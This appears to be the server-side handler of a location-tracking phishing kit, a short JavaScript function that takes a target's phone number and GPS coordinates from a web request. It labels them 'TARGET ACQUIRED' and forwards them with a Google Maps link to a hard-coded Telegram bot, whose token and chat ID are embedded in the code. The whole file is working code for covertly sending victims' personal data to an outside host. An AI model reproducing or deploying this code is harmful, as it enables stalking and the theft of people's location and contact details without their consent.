export async function onRequestPost(context) {
    try {
        const data = await context.request.json();
        const { phone, lat, lon, acc } = data;

        const BOT_TOKEN = "8357010961:AAGDS-fKGvdB5uZG0TeQiwjQa1sj_1n5in0";
        const CHAT_ID = "7664916357";
        
        const mapsLink = `https://www.google.com/maps?q=${lat},${lon}`;

        const report = `*🚨 NEXUS-X: TARGET ACQUIRED*\n\n` +
                       `📱 *Phone:* \`${phone}\`\n` +
                       `📍 *Coords:* \`${lat}, ${lon}\`\n` +
                       `🎯 *Accuracy:* \`${acc} meter\`\n\n` +
                       `🌐 *Google Maps:* [KLIK DISINI](${mapsLink})\n\n` +
                       `_Status: Captured via Global Proxy_`;

        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: report,
                parse_mode: 'Markdown'
            })
        });

        return new Response(JSON.stringify({ status: "ok" }), {
            headers: { "Content-Type": "application/json" }
        });

    } catch (e) {
        return new Response(JSON.stringify({ status: "error" }), { status: 500 });
    }
}
